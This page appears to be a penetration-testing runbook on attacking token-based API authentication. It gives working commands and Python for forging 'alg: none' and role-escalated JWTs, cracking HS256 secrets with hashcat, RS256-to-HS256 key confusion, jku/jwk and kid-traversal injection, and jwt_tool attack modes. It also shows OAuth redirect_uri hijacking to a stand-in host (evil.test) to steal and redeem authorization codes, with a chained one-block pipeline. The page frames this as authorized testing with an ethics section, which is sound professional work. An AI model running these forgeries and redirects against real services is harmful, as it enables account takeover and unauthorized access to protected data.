---
title: "JWT, OAuth & API Authentication Abuse"
description: "Token-based auth weaknesses: JWT algorithm confusion, weak secrets, JWK injection, OAuth misconfiguration, and the flows that leak credentials."
phase: API
order: 2
tags:
  - jwt
  - oauth
  - authentication
  - tokens
tools:
  - jwt_tool
  - hashcat
  - curl
  - burp suite
updated: 2026-10-01
---

A runbook for testing token-based API authentication on **in-scope, authorized** targets only. Goal: decode a token, identify its algorithm and claims, and systematically test forgery, secret weakness, and OAuth flow flaws until one yields unauthorized access.

## 1. Capture and decode the token

Pull a token from a proxy history, login response, or storage. Split it and decode the two base64url segments.

```bash
TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.sig"
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Loose base64url helper (handles padding)
decode() { echo "$1" | tr '_-' '/+' | awk '{ l=length($0)%4; if(l==2)$0=$0"=="; else if(l==3)$0=$0"="; print }' | base64 -d 2>/dev/null | jq .; }
decode "$(echo "$TOKEN" | cut -d. -f1)"
```

Record `alg`, `kid`, and any `jwk`/`jku` header, plus `sub`, `role`, `exp`, `iss`.

## 2. Tamper claims and test `alg: none`

```bash
python3 - <<'EOF'
import base64, json
def b64(o): return base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
h={"alg":"none","typ":"JWT"}; p={"sub":"admin","role":"admin"}
print(f"{b64(h)}.{b64(p)}.")
EOF
```

Send the unsigned token and the role-swapped variants to a protected endpoint.

```bash
curl -s -H "Authorization: Bearer <forged>" https://api.target.com/v1/admin/whoami -i
```

## 3. Crack an HS256 secret

If the algorithm is HMAC, test for a weak secret offline.

```bash
echo "$TOKEN" > token.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 token.txt --show
```

Once recovered, forge arbitrary claims with a valid signature.

## 4. Algorithm confusion (RS256 → HS256)

Fetch the public key, then re-sign using it as the HMAC secret. Some libraries trust the header's `alg` over the configured one.

```bash
curl -s https://api.target.com/.well-known/jwks.json | jq .
curl -s https://api.target.com/.well-known/jwks.json | jq -r '.keys[0].n' > pub.txt

python3 - <<'EOF'
import jwt
pub = open("pub.txt").read().strip()
print(jwt.encode({"sub":"admin","role":"admin"}, pub, algorithm="HS256"))
EOF
```

## 5. JWK / JKU / kid injection

Point the verifier at a key you control, or embed one directly.

```bash
# Header jwk: embed your own public key
# Header jku: point to a URL you host
curl -s -H "Authorization: Bearer <injected>" https://api.target.com/v1/me -i

# kid path traversal / SQLi in legacy resolvers
python3 -c 'import jwt;print(jwt.encode({"sub":"admin"}, open("/dev/null").read(), algorithm="HS256", headers={"kid":"../../dev/null"}))'
```

## 6. Drive jwt_tool through the whole flow

```bash
jwt_tool "$TOKEN" -M at            # all attack modes
jwt_tool "$TOKEN" -X k -pk pub.pem # key confusion
jwt_tool "$TOKEN" -C -d wordlist.txt # crack secret
jwt_tool "$TOKEN" -T                  # tamper interactive
```

## 7. OAuth 2.0 / OIDC flow tests

Test the flow end to end, not just the token.

```bash
# Redirect URI manipulation
curl -s -i "https://auth.target.com/authorize?client_id=abc&redirect_uri=https://evil.test/cb&response_type=code&state=x"

# Redeem a captured code yourself to prove the redirect flaw
curl -s -X POST https://auth.target.com/token \
  -d grant_type=authorization_code -d code=<code> \
  -d redirect_uri=https://evil.test/cb -d client_id=abc
```

- Missing `state`: replay the authorization request to test CSRF.
- PKCE downgrade: strip `code_challenge` and see if the server still issues a token.
- Scope escalation: request `scope=admin` and check what is honored.

## 8. Full pipeline (one block)

```bash
TOKEN=$(curl -s -X POST https://api.target.com/login -d 'u=user&p=pass' | jq -r .access_token)
echo "$TOKEN" > token.txt
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt; hashcat -m 16500 token.txt --show
jwt_tool "$TOKEN" -M at
jwt_tool "$TOKEN" -X k -pk pub.pem

curl -s -H "Authorization: Bearer $TOKEN" https://api.target.com/v1/me -i
curl -s -i "https://auth.target.com/authorize?client_id=abc&redirect_uri=https://evil.test/cb&response_type=code&state=x"
```

## 9. Rate limiting & session handling

- Measure throttling on login, OTP and token endpoints.
- Try GraphQL aliases or HTTP/2 multiplexing to bypass limiter counts.
- Check cookies for `HttpOnly`, `Secure`, `SameSite`, and whether tokens appear in URLs or logs.

## Ethics & legality

- Only test APIs you own or are explicitly authorized to assess in writing.
- Crack secrets and OTPs at minimal scale; stop once a flaw is proven.
- Redact real token and secret values in the final report.
